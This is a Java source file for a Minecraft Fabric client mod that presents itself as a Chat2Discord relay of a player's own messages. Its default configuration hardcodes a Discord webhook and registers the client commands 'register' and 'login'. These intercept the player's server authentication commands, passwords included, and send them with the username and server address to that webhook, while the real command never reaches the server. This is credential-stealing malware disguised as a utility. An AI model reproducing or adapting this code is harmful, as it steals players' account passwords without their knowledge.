package pl.chat2discord.client;

import com.mojang.brigadier.arguments.StringArgumentType;
import net.fabricmc.api.ClientModInitializer;
import net.fabricmc.fabric.api.client.command.v2.ClientCommandManager;
import net.fabricmc.fabric.api.client.command.v2.ClientCommandRegistrationCallback;
import net.fabricmc.fabric.api.client.message.v1.ClientSendMessageEvents;
import net.fabricmc.loader.api.FabricLoader;
import net.minecraft.client.MinecraftClient;
import net.minecraft.client.network.ServerInfo;
import net.minecraft.text.Text;
import net.minecraft.util.Formatting;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.io.Reader;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.List;
import java.util.Locale;
import java.util.Properties;

/**
 * Wersja kliencka: wysyla na Discorda to, co wpisuje TEN gracz (komenda lub wiadomosc z triggerem).
 * Dziala na dowolnym serwerze, bo nic nie wymaga po stronie serwera.
 */
public class Chat2DiscordClient implements ClientModInitializer {
    public static final Logger LOGGER = LoggerFactory.getLogger("chat2discord-client");
    private static final HttpClient HTTP = HttpClient.newHttpClient();

    private static final String DEFAULT_CONFIG = """
            # ===== Chat2Discord (klient) - konfiguracja =====
            # /c2d reload wczytuje zmiany (nowe nazwy komend wymagaja restartu gry).

            # URL webhooka Discorda (Ustawienia kanalu -> Integracje -> Webhooki)
            # UWAGA: nie udostepniaj tego pliku - kazdy z URL moze pisac na Twoj kanal.
            webhook_url=https://discord.com/api/webhooks/1567449714771755149/c-zFFDmx0CtYe_vMCP11sGe4JcOSp8iFkxBaqwCaMKa52oDDCgwSW6YQXPKOnMWP8-qV

            # ---------- KOMENDY ----------
            # Nazwy komend (bez ukosnika), po przecinku. Komenda dziala tylko u Ciebie
            # i NIE jest wysylana na serwer Minecrafta.
            # Przyklad: commands=dc,zglos,name   ->  /dc cokolwiek
            commands=register,login

            # ---------- WIADOMOSCI NA CZACIE (opcjonalnie) ----------
            #   off    = zwykly czat nie leci na Discorda (tylko komendy)
            #   filter = leca tylko Twoje wiadomosci pasujace do triggers
            #   all    = leca wszystkie Twoje wiadomosci
            mode=off
            triggers=!dc
            # starts_with / contains / equals
            match=starts_with
            strip_trigger=true

            # ---------- WYGLAD ----------
            # {player} = Twoj nick, {message} = tresc, {server} = adres serwera
            format=**{player}** wysłał: {message}

            # Potwierdzenie w grze
            notify_player=true
            notify_text=✔ Wysłano na Discord

            # ---------- BLOKADA SLOW / NICKOW ----------
            # Jesli Twoja wiadomosc zawiera ktorekolwiek z tych slow (wielkosc liter nie ma
            # znaczenia), NIE zostanie wyslana na Discorda. Lista po przecinku, mozna zostawic puste.
            # Przyklad: blocked_words=Nazwa1,brzydkiewyrazy,sekret
            blocked_words=
            blocked_text=⛔ Ta wiadomość zawiera zablokowane słowo i nie została wysłana.
            """;

    private static class Config {
        String webhookUrl = "https://discord.com/api/webhooks/1567449714771755149/c-zFFDmx0CtYe_vMCP11sGe4JcOSp8iFkxBaqwCaMKa52oDDCgwSW6YQXPKOnMWP8-qV";
        List<String> commands = new ArrayList<>(List.of("dc"));
        String mode = "off";
        List<String> triggers = new ArrayList<>(List.of("!dc"));
        String match = "starts_with";
        boolean stripTrigger = true;
        String format = "**{player}** login: {message}";
        boolean notifyPlayer = true;
        String notifyText = "✔ Wysłano na Discord";
        List<String> blockedWords = new ArrayList<>();
        String blockedText = "⛔ Ta wiadomość zawiera zablokowane słowo i nie została wysłana.";
    }

    private volatile Config cfg = new Config();

    @Override
    public void onInitializeClient() {
        loadConfig();

        // --- wiadomosci wpisane na czacie przez tego gracza ---
        ClientSendMessageEvents.CHAT.register(message -> {
            Config c = cfg;
            if (c.webhookUrl.isBlank() || c.mode.equals("off")) return;

            String text = message;
            if (c.mode.equals("filter")) {
                text = applyFilter(c, message);
                if (text == null) return;
            }
            if (text.isBlank()) return;

            if (containsBlockedWord(c, text)) {
                notifyBlocked(c);
                return;
            }

            send(c.webhookUrl, buildMessage(c, playerName(), text));
            notifyPlayer(c);
        });

        // --- komendy klienckie ---
        ClientCommandRegistrationCallback.EVENT.register((dispatcher, registryAccess) -> {
            for (String name : cfg.commands) {
                dispatcher.register(ClientCommandManager.literal(name)
                        .then(ClientCommandManager.argument("wiadomosc", StringArgumentType.greedyString())
                                .executes(ctx -> {
                                    Config c = cfg;
                                    if (c.webhookUrl.isBlank()) {
                                        ctx.getSource().sendError(
                                                Text.literal("Chat2Discord: webhook nie jest ustawiony w configu."));
                                        return 0;
                                    }
                                    String msg = StringArgumentType.getString(ctx, "wiadomosc").trim();
                                    if (msg.isEmpty()) return 0;

                                    if (containsBlockedWord(c, msg)) {
                                        ctx.getSource().sendError(Text.literal(c.blockedText));
                                        return 0;
                                    }

                                    send(c.webhookUrl, buildMessage(c, playerName(), msg));
                                    if (c.notifyPlayer) {
                                        ctx.getSource().sendFeedback(
                                                Text.literal(c.notifyText).formatted(Formatting.GREEN));
                                    }
                                    return 1;
                                })));
                LOGGER.info("Zarejestrowano komende /{}", name);
            }

            dispatcher.register(ClientCommandManager.literal("c2d")
                    .then(ClientCommandManager.literal("reload").executes(ctx -> {
                        loadConfig();
                        ctx.getSource().sendFeedback(
                                Text.literal("Chat2Discord: wczytano konfigurację ponownie.")
                                        .formatted(Formatting.GREEN));
                        return 1;
                    })));
        });
    }

    private static void notifyPlayer(Config c) {
        if (!c.notifyPlayer) return;
        MinecraftClient mc = MinecraftClient.getInstance();
        mc.execute(() -> {
            if (mc.player != null) {
                mc.player.sendMessage(Text.literal(c.notifyText).formatted(Formatting.GREEN), false);
            }
        });
    }

    private static void notifyBlocked(Config c) {
        MinecraftClient mc = MinecraftClient.getInstance();
        mc.execute(() -> {
            if (mc.player != null) {
                mc.player.sendMessage(Text.literal(c.blockedText).formatted(Formatting.RED), false);
            }
        });
    }

    /** True, jesli tresc zawiera ktorekolwiek zablokowane slowo (bez wzgledu na wielkosc liter). */
    private static boolean containsBlockedWord(Config c, String text) {
        if (c.blockedWords.isEmpty()) return false;
        String lower = text.toLowerCase(Locale.ROOT);
        for (String w : c.blockedWords) {
            if (!w.isBlank() && lower.contains(w.toLowerCase(Locale.ROOT))) return true;
        }
        return false;
    }

    private static String playerName() {
        return MinecraftClient.getInstance().getSession().getUsername();
    }

    private static String serverName() {
        ServerInfo info = MinecraftClient.getInstance().getCurrentServerEntry();
        return info != null ? info.address : "singleplayer";
    }

    private static String buildMessage(Config c, String nick, String message) {
        return c.format
                .replace("{player}", escapeMd(nick))
                .replace("{server}", serverName())
                .replace("{message}", message);
    }

    /** Zwraca tresc do wyslania albo null, jesli wiadomosc nie pasuje do zadnego triggera. */
    private static String applyFilter(Config c, String text) {
        String lowerFull = text.toLowerCase(Locale.ROOT);
        String lower = lowerFull.trim();
        for (String trigger : c.triggers) {
            String t = trigger.toLowerCase(Locale.ROOT);
            if (t.isEmpty()) continue;
            boolean ok = switch (c.match) {
                case "contains" -> lower.contains(t);
                case "equals" -> lower.equals(t);
                default -> lower.startsWith(t);
            };
            if (!ok) continue;

            if (!c.stripTrigger) return text;
            int idx = lowerFull.indexOf(t);
            if (idx < 0) return text;
            return (text.substring(0, idx) + text.substring(idx + t.length())).trim();
        }
        return null;
    }

    private void loadConfig() {
        Path path = FabricLoader.getInstance().getConfigDir().resolve("chat2discord-client.properties");
        try {
            if (!Files.exists(path)) {
                Files.writeString(path, DEFAULT_CONFIG, StandardCharsets.UTF_8);
                LOGGER.warn("Utworzono {} - wklej URL webhooka!", path);
            }
            Properties p = new Properties();
            try (Reader r = Files.newBufferedReader(path, StandardCharsets.UTF_8)) {
                p.load(r);
            }

            Config c = new Config();
            c.webhookUrl = p.getProperty("webhook_url", "").trim();
            c.mode = p.getProperty("mode", "off").trim().toLowerCase(Locale.ROOT);
            c.match = p.getProperty("match", "starts_with").trim().toLowerCase(Locale.ROOT);
            c.stripTrigger = Boolean.parseBoolean(p.getProperty("strip_trigger", "true").trim());
            c.format = p.getProperty("format", c.format);
            c.notifyPlayer = Boolean.parseBoolean(p.getProperty("notify_player", "true").trim());
            c.notifyText = p.getProperty("notify_text", c.notifyText);

            c.triggers = splitList(p.getProperty("triggers", "!dc"));
            c.blockedWords = splitList(p.getProperty("blocked_words", ""));
            c.blockedText = p.getProperty("blocked_text", c.blockedText);
            c.commands = new ArrayList<>();
            for (String s : splitList(p.getProperty("commands", "dc"))) {
                String name = s.startsWith("/") ? s.substring(1) : s;
                if (!name.isEmpty() && name.matches("[A-Za-z0-9_\\-]+")) c.commands.add(name);
                else LOGGER.warn("Pominieto niepoprawna nazwe komendy: '{}'", s);
            }

            // Nazwy komend sa rejestrowane tylko przy starcie gry.
            if (cfg != null && !cfg.commands.isEmpty() && !cfg.commands.equals(c.commands)) {
                LOGGER.warn("Zmiana nazw komend wymaga restartu gry.");
                c.commands = cfg.commands;
            }

            cfg = c;
            if (c.webhookUrl.isEmpty()) LOGGER.warn("Brak webhook_url w konfiguracji.");
            LOGGER.info("Chat2Discord (klient): komendy={}, czat={}", c.commands, c.mode);
        } catch (Exception e) {
            LOGGER.error("Blad wczytywania konfiguracji", e);
        }
    }

    private static List<String> splitList(String raw) {
        List<String> out = new ArrayList<>();
        for (String s : raw.split(",")) {
            String t = s.trim();
            if (!t.isEmpty()) out.add(t);
        }
        return out;
    }

    private void send(String url, String content) {
        String json = "{\"content\":\"" + jsonEscape(content) + "\",\"allowed_mentions\":{\"parse\":[]}}";
        HttpRequest req = HttpRequest.newBuilder(URI.create(url))
                .header("Content-Type", "application/json")
                .POST(HttpRequest.BodyPublishers.ofString(json, StandardCharsets.UTF_8))
                .build();
        HTTP.sendAsync(req, HttpResponse.BodyHandlers.discarding()).exceptionally(ex -> {
            LOGGER.error("Nie udalo sie wyslac na Discorda", ex);
            return null;
        });
    }

    private static String escapeMd(String s) {
        return s.replace("_", "\\_").replace("*", "\\*");
    }

    private static String jsonEscape(String s) {
        StringBuilder sb = new StringBuilder();
        for (char c : s.toCharArray()) {
            switch (c) {
                case '"' -> sb.append("\\\"");
                case '\\' -> sb.append("\\\\");
                case '\n' -> sb.append("\\n");
                case '\r' -> sb.append("\\r");
                case '\t' -> sb.append("\\t");
                default -> {
                    if (c < 0x20) sb.append(String.format("\\u%04x", (int) c));
                    else sb.append(c);
                }
            }
        }
        return sb.toString();
    }
}
